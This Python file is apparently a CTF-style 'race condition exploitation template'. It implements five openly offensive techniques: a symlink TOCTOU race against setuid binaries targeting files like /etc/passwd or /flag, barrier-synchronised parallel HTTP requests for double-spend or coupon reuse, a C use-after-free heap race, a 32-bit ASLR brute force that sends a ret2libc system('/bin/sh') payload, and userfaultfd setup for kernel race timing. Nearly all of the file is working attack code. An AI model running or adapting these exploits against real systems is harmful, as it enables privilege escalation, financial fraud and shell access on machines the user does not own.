#!/usr/bin/env python3
"""
Race Condition Exploitation Template
Covers:
  A. TOCTOU (Time-Of-Check-To-Time-Of-Use) — symlink race
  B. Parallel HTTP requests — concurrent request race window
  C. Heap/allocator race — multi-threaded heap state race
  D. Fork-server brute force — predict ASLR on 32-bit fork servers
  E. userfaultfd pause — precise kernel-level timing control
"""
import os, sys, time, threading, subprocess, struct, ctypes
from pathlib import Path

# ── A. TOCTOU Symlink Race ────────────────────────────────────────────────────
def toctou_symlink_race(vuln_binary: str, check_path: str, target_path: str,
                         n_threads: int = 30, timeout: int = 10):
    """
    TOCTOU race: swap symlink between `check_path` and `target_path`
    during the check-then-use window of a setuid binary.

    Args:
        vuln_binary: path to setuid binary that reads check_path
        check_path:  file the binary checks (e.g. /tmp/safe_input)
        target_path: privileged file to swap to (e.g. /etc/passwd, /flag)
    """
    print(f"[TOCTOU] Racing {check_path!r} → {target_path!r}")
    print(f"[TOCTOU] Triggering: {vuln_binary}")

    stop_event = threading.Event()
    wins = [0]

    def swap_loop():
        while not stop_event.is_set():
            try:
                os.symlink("/tmp/benign_file", check_path)
            except FileExistsError:
                os.unlink(check_path)
                continue
            time.sleep(0.0001)
            try:
                os.unlink(check_path)
                os.symlink(target_path, check_path)
            except Exception:
                pass
            time.sleep(0.0001)
            try:
                os.unlink(check_path)
            except Exception:
                pass

    # Benign file for the check
    Path("/tmp/benign_file").write_text("safe")
    try:
        os.unlink(check_path)
    except FileNotFoundError:
        pass

    # Start race thread
    race_t = threading.Thread(target=swap_loop, daemon=True)
    race_t.start()

    deadline = time.time() + timeout
    while time.time() < deadline:
        r = subprocess.run(
            [vuln_binary], capture_output=True, timeout=5, text=True
        )
        output = r.stdout + r.stderr
        if "flag" in output.lower() or "root" in output.lower() or r.returncode == 0:
            wins[0] += 1
            print(f"[+] Race won! Output:\n{output}")
            break
        sys.stdout.write(".")
        sys.stdout.flush()

    stop_event.set()
    print(f"\n[TOCTOU] Wins: {wins[0]}")
    return wins[0] > 0


# ── B. Parallel HTTP Race ─────────────────────────────────────────────────────
def parallel_http_race(url: str, method: str = "POST", data: dict = None,
                        headers: dict = None, n_threads: int = 20, n_rounds: int = 5):
    """
    Send N parallel requests to win a race condition window.
    Useful for: double-spend, coupon reuse, balance manipulation, TOCTOU in API.
    """
    import requests
    results = []
    lock = threading.Lock()

    def send(idx: int, barrier: threading.Barrier):
        try:
            barrier.wait()  # synchronize all threads to fire simultaneously
            r = requests.request(
                method, url, data=data or {}, headers=headers or {},
                timeout=10
            )
            with lock:
                results.append((idx, r.status_code, r.text[:200]))
        except Exception as e:
            with lock:
                results.append((idx, -1, str(e)))

    print(f"[parallel_http] Firing {n_threads} requests × {n_rounds} rounds at {url}")
    for rnd in range(n_rounds):
        barrier = threading.Barrier(n_threads)
        threads = [threading.Thread(target=send, args=(i, barrier), daemon=True)
                   for i in range(n_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=15)

        # Look for race win indicator (customize per challenge)
        for idx, status, body in results:
            if "flag" in body.lower() or "success" in body.lower():
                print(f"[+] Race win in round {rnd}! idx={idx} status={status}")
                print(f"    Body: {body}")
        results.clear()

    print("[parallel_http] Done")


# ── C. Multi-threaded Heap Race ───────────────────────────────────────────────
def heap_race_exploit(target_binary: str, n_threads: int = 10):
    """
    Multi-threaded heap corruption race.
    Creates N threads that simultaneously malloc/free to create a race window
    in the allocator state (e.g. UAF via concurrent free+use).
    """
    race_c = f"""
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>

#define N_THREADS {n_threads}
#define CHUNK_SIZE 0x20

static void* shared_chunk = NULL;
static volatile int go = 0;

void* writer_thread(void* arg) {{
    while (!go) ; // spin
    // Write to chunk (may be freed by another thread)
    if (shared_chunk) memset(shared_chunk, 0x41, CHUNK_SIZE);
    return NULL;
}}

void* freer_thread(void* arg) {{
    while (!go) ;
    free(shared_chunk);
    shared_chunk = NULL;
    return NULL;
}}

int main() {{
    pthread_t threads[N_THREADS];
    shared_chunk = malloc(CHUNK_SIZE);
    printf("[heap_race] chunk allocated at %p\\n", shared_chunk);

    for (int i = 0; i < N_THREADS/2; i++) {{
        pthread_create(&threads[i], NULL, writer_thread, NULL);
        pthread_create(&threads[N_THREADS/2 + i], NULL, freer_thread, NULL);
    }}

    go = 1; // fire all threads simultaneously

    for (int i = 0; i < N_THREADS; i++) pthread_join(threads[i], NULL);
    printf("[heap_race] Done — check for heap corruption\\n");
    return 0;
}}
"""
    c_path  = "/tmp/heap_race.c"
    bin_path = "/tmp/heap_race"
    Path(c_path).write_text(race_c)
    r = subprocess.run(
        ["gcc", "-O0", "-pthread", "-o", bin_path, c_path],
        capture_output=True, text=True
    )
    if r.returncode != 0:
        print(f"[-] Compile error: {r.stderr}")
        return
    out = subprocess.check_output([bin_path], text=True)
    print(f"[heap_race] {out}")


# ── D. Fork-server ASLR Brute Force (32-bit) ─────────────────────────────────
def fork_server_brute(target: str, payload_fn, max_attempts: int = 512):
    """
    On 32-bit binaries with fork() servers, ASLR entropy is ~8 bits (256 possibilities).
    Send exploit payload repeatedly — correct base ~1/256 chance per attempt.

    Args:
        target: (host, port) tuple or binary path
        payload_fn: callable(base_addr) → bytes payload
    """
    print(f"[fork_brute] 32-bit ASLR brute: {max_attempts} attempts")
    import socket

    libc_bases_32bit = [0xf7200000 + i * 0x1000 for i in range(256)]

    for attempt, base in enumerate(libc_bases_32bit[:max_attempts]):
        payload = payload_fn(base)
        try:
            if isinstance(target, str):
                p = subprocess.Popen(
                    [target], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL
                )
                stdout, _ = p.communicate(payload, timeout=2)
                if p.returncode != 0 and b"sh" not in stdout:
                    continue
            else:
                host, port = target
                with socket.create_connection((host, port), timeout=3) as s:
                    s.sendall(payload)
                    resp = s.recv(1024)
                    if b"$" in resp or b"flag" in resp.lower():
                        print(f"[+] Win at attempt {attempt} with base {base:#x}!")
                        return base

            sys.stdout.write(f"\r[fork_brute] Attempt {attempt}/{max_attempts} "
                             f"base={base:#x}   ")
            sys.stdout.flush()
        except (subprocess.TimeoutExpired, ConnectionRefusedError, OSError):
            continue

    print(f"\n[-] Brute force exhausted after {max_attempts} attempts")
    return None


# ── E. userfaultfd Timing Control ─────────────────────────────────────────────
def userfaultfd_demo():
    """
    userfaultfd allows user-space to handle page faults, creating precise
    timing windows when kernel performs copy_from_user on a faulting page.
    Useful for: kernel TOCTOU, splice() races, pipe splicing.
    Requires /proc/sys/vm/unprivileged_userfaultfd = 1 (or root).
    """
    NR_USERFAULTFD = 323  # x86_64

    # Open userfaultfd
    uffd = ctypes.CDLL("libc.so.6").syscall(NR_USERFAULTFD, 0)
    if uffd < 0:
        errno = ctypes.get_errno()
        print(f"[-] userfaultfd syscall failed (errno={errno})")
        print(f"[-] Check: cat /proc/sys/vm/unprivileged_userfaultfd")
        return None

    print(f"[+] userfaultfd fd = {uffd}")

    # UFFDIO_API ioctl to init
    UFFDIO_API    = 0xc018aa3f
    class uffdio_api(ctypes.Structure):
        _fields_ = [("api", ctypes.c_uint64), ("features", ctypes.c_uint64),
                    ("ioctls", ctypes.c_uint64)]
    api = uffdio_api(api=0xaa, features=0, ioctls=0)
    if ctypes.CDLL("libc.so.6").ioctl(uffd, UFFDIO_API, ctypes.byref(api)) < 0:
        print("[-] UFFDIO_API failed")
        return None

    print(f"[+] userfaultfd initialized (features={api.features:#x})")
    print("[!] Implement: mmap fault page → register → fault handler thread")
    print("[!] Place fault page at kernel copy boundary for timing control")
    return uffd


# ── Main demo ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Race condition exploit template")
    parser.add_argument("--mode", choices=["toctou", "http", "heap", "fork", "uffd"],
                        default="toctou")
    parser.add_argument("--target", default="./vuln_binary")
    args = parser.parse_args()

    if args.mode == "toctou":
        # Example: SUID binary that reads /tmp/user_input
        toctou_symlink_race(
            vuln_binary=args.target,
            check_path="/tmp/user_input",
            target_path="/flag",
            n_threads=20,
            timeout=30,
        )
    elif args.mode == "http":
        parallel_http_race(
            url="http://localhost:5000/transfer",
            method="POST",
            data={"amount": "100", "to": "attacker"},
            n_threads=20,
        )
    elif args.mode == "heap":
        heap_race_exploit(args.target)
    elif args.mode == "fork":
        # Example 32-bit brute force
        def make_payload(libc_base):
            system_off = 0x3ada0  # system() offset in libc — fill from readelf
            system = libc_base + system_off
            binsh  = libc_base + 0x15ba0b  # /bin/sh string — fill from strings
            return b"A" * 52 + struct.pack("<III", system, 0xdeadbeef, binsh)
        fork_server_brute(args.target, make_payload)
    elif args.mode == "uffd":
        userfaultfd_demo()
